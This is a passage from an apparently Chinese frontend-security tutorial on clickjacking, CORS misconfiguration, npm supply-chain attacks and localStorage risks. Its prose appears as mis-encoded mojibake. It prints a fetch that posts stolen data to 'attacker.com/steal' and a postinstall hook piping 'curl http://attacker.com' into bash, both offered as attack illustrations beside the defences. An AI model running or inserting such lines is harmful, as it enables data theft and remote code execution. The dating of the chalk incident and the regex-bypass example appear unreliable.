<h2 data-id="heading-6">ç‚¹å‡»åŠ«æŒï¼šéšœçœ¼æ³•</h2>
<p>ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰æ˜¯æŠŠç›®æ ‡ç½‘ç«™ç”¨é€æ˜ iframe åµŒå…¥åˆ°æ”»å‡»è€…ç½‘ç«™ï¼Œç”¨æˆ·ä»¥ä¸ºåœ¨ç‚¹æ”»å‡»è€…çš„é¡µé¢ï¼Œå®é™…ç‚¹çš„æ˜¯ iframe é‡Œçš„ç›®æ ‡ç½‘ç«™ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph æ”»å‡»è€…é¡µé¢
        A[å‡æŒ‰é’®: é¢†å–ä¼˜æƒ åˆ¸]
        B[é€æ˜iframe: é“¶è¡Œè½¬è´¦é¡µé¢]
    end

    C[ç”¨æˆ·] --&gt;|ç‚¹å‡»å‡æŒ‰é’®| A
    A -.-&gt;|å®é™…è§¦å‘| B
    B --&gt;|æ‰§è¡Œ| D[é“¶è¡Œè½¬è´¦æ“ä½œ]
</code></pre>
<h3 data-id="heading-7">æ”»å‡»åœºæ™¯</h3>
<p>æ”»å‡»è€…é¡µé¢ä¸Šæ”¾äº†ä¸ª"é¢†å–ä¼˜æƒ åˆ¸"æŒ‰é’®ï¼Œä½†æŒ‰é’®ä¸‹é¢æ˜¯é€æ˜çš„ iframeï¼Œiframe é‡ŒåŠ è½½çš„æ˜¯é“¶è¡Œç½‘ç«™çš„è½¬è´¦ç¡®è®¤æŒ‰é’®ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ”»å‡»è€…é¡µé¢ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-tag">iframe</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.01</span>;  <span class="hljs-comment">/* å‡ ä¹é€æ˜ */</span>
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;
  }
  <span class="hljs-selector-class">.fake-button</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">100px</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fake-button"</span>&gt;</span>é¢†å–ä¼˜æƒ åˆ¸<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>ç”¨æˆ·ç‚¹"é¢†å–ä¼˜æƒ åˆ¸"ï¼Œå®é™…è§¦å‘äº† iframe é‡Œé“¶è¡Œç½‘ç«™çš„è½¬è´¦ç¡®è®¤æŒ‰é’®ã€‚</p>
<h3 data-id="heading-8">é˜²æŠ¤æ‰‹æ®µ</h3>
<p><strong>1. X-Frame-Options å¤´</strong></p>
<p>æœ€ç®€å•æœ‰æ•ˆçš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">DENY</span>        <span class="hljs-comment"># å®Œå…¨ç¦æ­¢è¢« iframe åµŒå…¥</span>
<span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">SAMEORIGIN</span>  <span class="hljs-comment"># åªå…è®¸åŒæºåµŒå…¥</span>
</code></pre>
<p>Nginx é…ç½®ï¼š</p>
<pre><code class="hljs language-nginx" lang="nginx">add_header X-Frame-Options "SAMEORIGIN" always;
</code></pre>
<p><strong>2. CSP frame-ancestorsï¼ˆæ¨èï¼‰</strong></p>
<p>æ›´ç°ä»£çš„æ–¹æ¡ˆï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-attribute">Content-Security-Policy</span>: frame-ancestors <span class="hljs-string">'self'</span> <span class="hljs-attribute">https</span>:<span class="hljs-comment">//trusted.com</span>
</code></pre>
<p>å¯ä»¥æŒ‡å®šå¤šä¸ªå…è®¸çš„åŸŸåï¼Œæ¯” X-Frame-Options çµæ´»ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åªå…è®¸åŒæº</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span>

<span class="hljs-comment"># å…è®¸å¤šä¸ªä¿¡ä»»åŸŸå</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span> https://trusted1.com https://trusted2.com

<span class="hljs-comment"># å®Œå…¨ç¦æ­¢</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'none'</span>
</code></pre>
<p><strong>3. SameSite Cookie</strong></p>
<p>å³ä½¿é¡µé¢è¢«åµŒå…¥ iframeï¼Œè®¾ç½®äº† <code>SameSite=Strict</code> æˆ– <code>SameSite=Lax</code> çš„ Cookie ä¸ä¼šå‘é€ï¼Œç”¨æˆ·åœ¨ iframe é‡Œç›¸å½“äºæœªç™»å½•çŠ¶æ€ï¼Œæ— æ³•å®Œæˆæ•æ„Ÿæ“ä½œã€‚</p>
<p><strong>4. å‰ç«¯æ£€æµ‹</strong></p>
<p>JavaScript æ£€æµ‹é¡µé¢æ˜¯å¦è¢«åµŒå…¥ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span> !== <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>) {
  <span class="hljs-comment">// é¡µé¢è¢«åµŒå…¥ iframe</span>
  <span class="hljs-comment">// å¯ä»¥è·³å‡º iframe æˆ–æ˜¾ç¤ºè­¦å‘Š</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span>.<span class="hljs-property">location</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>.<span class="hljs-property">location</span>;
}
</code></pre>
<p>ä½†è¿™ä¸ªæ–¹æ³•ä¸å¤ªå¯é ï¼Œæ”»å‡»è€…å¯ä»¥ç”¨ <code>sandbox</code> å±æ€§ç¦ç”¨è„šæœ¬ã€‚å»ºè®®ä½œä¸ºè¾…åŠ©æ‰‹æ®µï¼Œä¸»è¦è¿˜æ˜¯é  HTTP å¤´ã€‚</p>
<p>è¿™ä¸‰ä¸ªæ‰‹æ®µå»ºè®®åŒæ—¶ä½¿ç”¨ï¼Œå½¢æˆçºµæ·±é˜²å¾¡ã€‚</p>
<hr/>
<h2 data-id="heading-9">CORS é…ç½®é”™è¯¯ï¼šå¼€é”™äº†é—¨</h2>
<p>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æœ¬èº«æ˜¯å®‰å…¨æœºåˆ¶ï¼Œä½†é…ç½®ä¸å½“åè€Œä¼šé€ æˆæ¼æ´ã€‚</p>
<h3 data-id="heading-10">å±é™©é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯ä»£ç  - å±é™©ç¤ºä¾‹</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// æŠŠè¯·æ±‚çš„ Origin ç›´æ¥åå°„å›å»ï¼Œå¤ªå±é™©äº†</span>
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>è¿™æ ·é…ç½®ç­‰äºå¯¹æ‰€æœ‰ç½‘ç«™æ•å¼€å¤§é—¨ã€‚æ”»å‡»è€…ç½‘ç«™å¯ä»¥å‘è¯·æ±‚è·å–ç”¨æˆ·æ•°æ®ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ”»å‡»è€…ç½‘ç«™ (evil.com)</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.target.com/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// å¸¦ä¸Š cookie</span>
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
  <span class="hljs-comment">// æ‹¿åˆ°ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://attacker.com/steal'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
  });
});
</code></pre>
<p>å› ä¸ºå“åº”å¤´å…è®¸ä»»æ„ Origin å¹¶ä¸”å…è®¸æºå¸¦å‡­è¯ï¼Œæ”»å‡»è€…å¯ä»¥è½»æ¾çªƒå–ç”¨æˆ·æ•°æ®ã€‚</p>
<h3 data-id="heading-11">å®‰å…¨é…ç½®</h3>
<p><strong>1. ç™½åå•éªŒè¯</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOrigins = [
  <span class="hljs-string">'https://myapp.com'</span>,
  <span class="hljs-string">'https://admin.myapp.com'</span>,
  <span class="hljs-string">'https://mobile.myapp.com'</span>
];

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (allowedOrigins.<span class="hljs-title function_">includes</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>2. æ­£åˆ™åŒ¹é…ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOriginPattern = <span class="hljs-regexp">/^https:\/\/.*\.myapp\.com$/</span>;

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (origin &amp;&amp; allowedOriginPattern.<span class="hljs-title function_">test</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>æ³¨æ„æ­£åˆ™è¦ä¸¥æ ¼ï¼Œé¿å…è¢«ç»•è¿‡ã€‚æ¯”å¦‚ <code>/\.myapp\.com$/</code> å¯ä»¥è¢« <code>evil.com.myapp.com</code> ç»•è¿‡ã€‚</p>
<p><strong>3. é™åˆ¶å…è®¸çš„æ–¹æ³•å’Œå¤´</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Methods'</span>, <span class="hljs-string">'GET, POST, PUT, DELETE'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Headers'</span>, <span class="hljs-string">'Content-Type, Authorization'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Max-Age'</span>, <span class="hljs-string">'86400'</span>);  <span class="hljs-comment">// é¢„æ£€è¯·æ±‚ç¼“å­˜ 24 å°æ—¶</span>
</code></pre>
<p><strong>CORS å®‰å…¨åŸåˆ™</strong>ï¼š</p>
<ul>
<li>ä¸è¦ç”¨é€šé…ç¬¦ <code>*</code>ï¼ˆè€Œä¸” <code>*</code> å’Œ <code>credentials: true</code> ä¸èƒ½åŒæ—¶ç”¨ï¼‰</li>
<li>ä¸è¦åŠ¨æ€åå°„ Origin è€Œä¸éªŒè¯</li>
<li>ç™½åå•è¦ç²¾ç¡®åˆ°åè®®+åŸŸå+ç«¯å£</li>
<li>é™åˆ¶å…è®¸çš„ HTTP æ–¹æ³•</li>
<li>æ•æ„Ÿæ¥å£ä¸è¦å¼€å¯ CORSï¼Œæˆ–è€…ä¸¥æ ¼é™åˆ¶ Origin</li>
</ul>
<hr/>
<h2 data-id="heading-12">ä¾èµ–å®‰å…¨ï¼šä¾›åº”é“¾æ”»å‡»</h2>
<p>npm ç”Ÿæ€æœ‰ä¸ªé—®é¢˜ï¼šå®‰è£…ä¸€ä¸ªåŒ…ä¼šå¼•å…¥ 79 ä¸ªç¬¬ä¸‰æ–¹ä¾èµ–å’Œ 39 ä¸ªç»´æŠ¤è€…çš„éšå¼ä¿¡ä»»ã€‚å¦‚æœæŸä¸ªä¾èµ–è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä½ çš„é¡¹ç›®å°±å±é™©äº†ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph ä½ çš„é¡¹ç›®
        A[package.json]
    end

    subgraph ç›´æ¥ä¾èµ–
        B[lodash]
        C[axios]
    end

    subgraph é—´æ¥ä¾èµ–
        D[follow-redirects]
        E[form-data]
        F[...]
    end

    A --&gt; B
    A --&gt; C
    C --&gt; D
    C --&gt; E
    D --&gt; F

    style F fill:#ff6b6b,color:#fff
    G[æ”»å‡»è€…æ§åˆ¶çš„åŒ…] -.-&gt;|æ›¿æ¢/å…¥ä¾µ| F
</code></pre>
<h3 data-id="heading-13">çœŸå®æ¡ˆä¾‹</h3>
<p><strong>2024 å¹´ chalk æ”»å‡»äº‹ä»¶</strong></p>
<p>æ”»å‡»è€…é€šè¿‡é’“é±¼é‚®ä»¶å…¥ä¾µäº†çŸ¥ååŒ… <code>chalk</code> çš„ç»´æŠ¤è€…è´¦å·ï¼Œç¯¡æ”¹äº†ä»£ç ã€‚<code>chalk</code> æ¯å‘¨ä¸‹è½½é‡è¶… 2 äº¿æ¬¡ï¼Œå½±å“é¢å·¨å¤§ã€‚æ¶æ„ä»£ç ä¼šåœ¨æµè§ˆå™¨ç«¯æ‰§è¡Œï¼ŒåŠ«æŒåŠ å¯†è´§å¸é’±åŒ…äº¤æ˜“ã€‚è™½ç„¶ 2.5 å°æ—¶åå°±è¢«å‘ç°å¹¶æ’¤å›ï¼Œä½†å·²ç»æœ‰ä¸å°‘é¡¹ç›®ä¸­æ‹›ã€‚</p>
<p>åŒæ—¶è¢«æ”»å‡»çš„è¿˜æœ‰ <code>debug</code>ã€<code>ansi-styles</code> ç­‰ 18 ä¸ªçƒ­é—¨åŒ…ï¼Œæ€»ä¸‹è½½é‡è¶… 20 äº¿æ¬¡/å‘¨ã€‚</p>
<h3 data-id="heading-14">å¸¸è§æ”»å‡»æ‰‹æ³•</h3>
<p><strong>1. ä¾èµ–æ··æ·†</strong></p>
<p>å…¬å¸å†…éƒ¨ç”¨ç§æœ‰ npm æºï¼ŒåŒ…åå« <code>@company/utils</code>ã€‚æ”»å‡»è€…åœ¨å…¬å…± npm ä¸Šæ³¨å†ŒåŒååŒ…ï¼Œå¦‚æœé…ç½®ä¸å½“ï¼Œnpm å¯èƒ½ä¼˜å…ˆå®‰è£…å…¬å…±æºçš„æ¶æ„åŒ…ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æ³¨å†Œå…¬å…±åŒ…</span>
npm publish @company/utils

<span class="hljs-comment"># å…¬å¸å†…éƒ¨å®‰è£…æ—¶ï¼Œå¦‚æœæ²¡æ­£ç¡®é…ç½®ï¼Œå¯èƒ½è£…åˆ°æ¶æ„åŒ…</span>
npm install @company/utils
</code></pre>
<p><strong>2. æ¶æ„å®‰è£…è„šæœ¬</strong></p>
<p>npm åŒ…å¯ä»¥åœ¨ <code>package.json</code> é‡Œå®šä¹‰å®‰è£…è„šæœ¬ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node malicious.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"curl http://attacker.com | bash"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä¸€ <code>npm install</code>ï¼Œè„šæœ¬å°±æ‰§è¡Œäº†ã€‚å¯ä»¥çªƒå–ç¯å¢ƒå˜é‡ã€æºç ã€å¯†é’¥ç­‰ã€‚</p>
<p><strong>3. Typosquattingï¼ˆé”™åˆ«å­—æ”»å‡»ï¼‰</strong></p>
<p>æ³¨å†Œä¸çŸ¥ååŒ…ç›¸ä¼¼çš„åå­—ï¼Œç­‰äººæ‰“é”™å­—ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ­£ç¡®çš„åŒ…</span>
npm install lodash

<span class="hljs-comment"># æ”»å‡»è€…æ³¨å†Œçš„æ¶æ„åŒ…</span>
npm install loadash  <span class="hljs-comment"># å°‘ä¸ª d</span>
npm install lodahs   <span class="hljs-comment"># h å’Œ s ä½ç½®åäº†</span>
</code></pre>
<h3 data-id="heading-15">é˜²å¾¡ä¾›åº”é“¾æ”»å‡»</h3>
<p><strong>1. é”å®šä¾èµ–ç‰ˆæœ¬</strong></p>
<p>ç”¨ <code>package-lock.json</code> æˆ– <code>yarn.lock</code> å›ºå®šä¾èµ–ç‰ˆæœ¬ï¼Œé˜²æ­¢è‡ªåŠ¨å‡çº§å¼•å…¥æ¶æ„ä»£ç ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json - ç²¾ç¡®ç‰ˆæœ¬ï¼Œä¸è¦ç”¨ ^ æˆ– ~</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lodash"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"4.17.21"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// ç²¾ç¡®ç‰ˆæœ¬</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.6.2"</span>        <span class="hljs-comment">// ä¸ç”¨ ^1.6.2 æˆ– ~1.6.2</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¹¶ä¸”æäº¤ <code>package-lock.json</code> åˆ°ä»£ç ä»“åº“ã€‚</p>
<p><strong>2. ä½¿ç”¨ npm ci</strong></p>
<p>CI/CD æµç¨‹ä¸­ç”¨ <code>npm ci</code> è€Œä¸æ˜¯ <code>npm install</code>ï¼Œç¡®ä¿ä¸¥æ ¼æŒ‰ç…§ lock æ–‡ä»¶å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># CI è„šæœ¬</span>
npm ci              <span class="hljs-comment"># ä¸¥æ ¼æŒ‰ lock æ–‡ä»¶å®‰è£…</span>
npm run build
npm <span class="hljs-built_in">test</span>
</code></pre>
<p><code>npm ci</code> çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>åˆ é™¤ <code>node_modules</code> é‡æ–°å®‰è£…</li>
<li>ä¸¥æ ¼æŒ‰ lock æ–‡ä»¶ï¼Œä¸ä¼šä¿®æ”¹å®ƒ</li>
<li>å¦‚æœ lock æ–‡ä»¶å’Œ package.json ä¸ä¸€è‡´ä¼šæŠ¥é”™</li>
</ul>
<p><strong>3. å®šæœŸå®¡è®¡ä¾èµ–</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm å†…ç½®å®¡è®¡</span>
npm audit
npm audit fix       <span class="hljs-comment"># è‡ªåŠ¨ä¿®å¤</span>

<span class="hljs-comment"># æˆ–è€…ç”¨ç¬¬ä¸‰æ–¹å·¥å…·</span>
npx snyk <span class="hljs-built_in">test</span>       <span class="hljs-comment"># Snyk</span>
npx socket security <span class="hljs-comment"># Socket</span>
</code></pre>
<p>è®¾ç½® CI è‡ªåŠ¨æ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Security</span> <span class="hljs-string">audit</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">audit</span> <span class="hljs-string">--audit-level=moderate</span>
</code></pre>
<p><strong>4. ç¦ç”¨å®‰è£…è„šæœ¬</strong></p>
<p>å¦‚æœä¸éœ€è¦è¿è¡Œå®‰è£…è„šæœ¬ï¼Œå¯ä»¥ç¦ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install --ignore-scripts
</code></pre>
<p>åœ¨ <code>.npmrc</code> é‡Œå…¨å±€è®¾ç½®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ignore-scripts</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>éœ€è¦è¿è¡Œè„šæœ¬æ—¶æ‰‹åŠ¨æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm rebuild
</code></pre>
<p><strong>5. ç§æœ‰æº + ç™½åå•</strong></p>
<p>å…¬å¸å†…éƒ¨æ­å»ºç§æœ‰ npm æºï¼ˆå¦‚ Verdaccioï¼‰ï¼Œåªå…è®¸å®¡æ ¸è¿‡çš„åŒ…è¿›å…¥ã€‚é…åˆ <code>@scope</code> å‘½åç©ºé—´ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .npmrc</span>
@company<span class="hljs-punctuation">:</span>registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//npm.company.com</span>
registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//registry.npmjs.org</span>
</code></pre>
<p>è¿™æ · <code>@company/</code> å¼€å¤´çš„åŒ…èµ°ç§æœ‰æºï¼Œå…¶ä»–åŒ…èµ°å…¬å…±æºã€‚</p>
<p><strong>6. æ£€æŸ¥ä¾èµ–å®Œæ•´æ€§</strong></p>
<p>ä½¿ç”¨ Subresource Integrityï¼ˆSRIï¼‰éªŒè¯ CDN èµ„æºï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/library.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å¦‚æœ CDN èµ„æºè¢«ç¯¡æ”¹ï¼Œæµè§ˆå™¨ä¼šæ‹’ç»åŠ è½½ã€‚</p>
<p><strong>7. å‡å°‘ä¾èµ–æ•°é‡</strong></p>
<p>å°‘ç”¨ä¾èµ–ã€‚ä¸€ä¸ª <code>left-pad</code> è¿™ç§åŠŸèƒ½è‡ªå·±å†™å‡ è¡Œä»£ç å°±èƒ½æå®šï¼Œæ²¡å¿…è¦å¼•å…¥å¤–éƒ¨åŒ…ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸éœ€è¦å®‰è£… left-pad</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">leftPad</span>(<span class="hljs-params">str, len, char = <span class="hljs-string">' '</span></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>(char).<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, len - <span class="hljs-title class_">String</span>(str).<span class="hljs-property">length</span>)) + str;
}
</code></pre>
<p>æ¯å¤šä¸€ä¸ªä¾èµ–å°±å¤šä¸€ä¸ªé£é™©ç‚¹ã€‚å®šæœŸæ£€æŸ¥ <code>node_modules</code>ï¼Œç§»é™¤ä¸ç”¨çš„åŒ…ã€‚</p>
<p><strong>å·¥å…·æ¨è</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flirantal%2Flockfile-lint" target="_blank" title="https://github.com/lirantal/lockfile-lint" ref="nofollow noopener noreferrer">lockfile-lint</a>ï¼šæ£€æµ‹ lockfile æ˜¯å¦è¢«ç¯¡æ”¹</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnaugtur%2Fnpm-audit-resolver" target="_blank" title="https://github.com/naugtur/npm-audit-resolver" ref="nofollow noopener noreferrer">npm-audit-resolver</a>ï¼šæ›´å¥½çš„æ¼æ´ä¿®å¤å·¥å…·</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnyk.io%2F" target="_blank" title="https://snyk.io/" ref="nofollow noopener noreferrer">Snyk</a>ï¼šä¾èµ–å®‰å…¨æ‰«æ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsocket.dev%2F" target="_blank" title="https://socket.dev/" ref="nofollow noopener noreferrer">Socket</a>ï¼šå®æ—¶ç›‘æ§ä¾èµ–å˜åŒ–</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdependabot" target="_blank" title="https://github.com/dependabot" ref="nofollow noopener noreferrer">Dependabot</a>ï¼šGitHub è‡ªåŠ¨æ›´æ–°ä¾èµ–çš„å®‰å…¨è¡¥ä¸</li>
</ul>
<hr/>
<h2 data-id="heading-16">æœ¬åœ°å­˜å‚¨å®‰å…¨ï¼šä¸è¯¥æ”¾çš„åˆ«æ”¾</h2>
<p>localStorage å’Œ sessionStorage å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒä»¬å¯¹ JavaScript å®Œå…¨å¯è§ã€‚åªè¦é¡µé¢æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…å°±èƒ½æŠŠé‡Œé¢çš„ä¸œè¥¿å…¨å·èµ°ã€‚</p>
<h3 data-id="heading-17">ä¸è¦å­˜è¿™äº›</h3>
<ul>
<li><strong>JWT Token</strong>ï¼šæœ€å¸¸è§çš„é”™è¯¯ï¼ŒXSS ä¸€å‘ç”Ÿå°±è¢«å·èµ°</li>
<li><strong>ç”¨æˆ·å¯†ç </strong>ï¼šå³ä½¿åŠ å¯†ä¹Ÿä¸è¦å­˜åœ¨å‰ç«¯</li>
<li><strong>ä¸ªäººæ•æ„Ÿä¿¡æ¯</strong>ï¼šèº«ä»½è¯å·ã€é“¶è¡Œå¡å·ã€æ‰‹æœºå·ç­‰</li>
<li><strong>API å¯†é’¥</strong>ï¼šåº”è¯¥åœ¨åç«¯ç®¡ç†</li>
<li><strong>ä¼šè¯ ID</strong>ï¼šç”¨ HttpOnly Cookie æ›´å®‰å…¨</li>
</ul>
<h3 data-id="heading-18">å¦‚æœéè¦å­˜</h3>
<ol>
<li><strong>è¯„ä¼°é£é™©</strong>ï¼šç¡®è®¤è¿™ä¸ªæ•°æ®æ³„éœ²åçš„å½±å“</li>
<li><strong>åŠ å¯†å­˜å‚¨</strong>ï¼šè™½ç„¶ä¸èƒ½é˜»æ­¢ XSS æ”»å‡»è€…æ‹¿åˆ°å¯†æ–‡ï¼Œä½†è‡³å°‘å¢åŠ ç ´è§£æˆæœ¬</li>
<li><strong>è®¾ç½®è¿‡æœŸæ—¶é—´</strong>ï¼šè‡ªå·±å®ç°è¿‡æœŸæœºåˆ¶ï¼Œå‡å°‘é•¿æœŸæš´éœ²çš„é£é™©</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å°è£…å¸¦è¿‡æœŸæ—¶é—´çš„å­˜å‚¨</span>
<span class="hljs-keyword">const</span> secureStorage = {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value, ttl = <span class="hljs-number">3600000</span></span>) {  <span class="hljs-comment">// é»˜è®¤ 1 å°æ—¶</span>
    <span class="hljs-keyword">const</span> item = {
      value,
      <span class="hljs-attr">expiry</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + ttl
    };
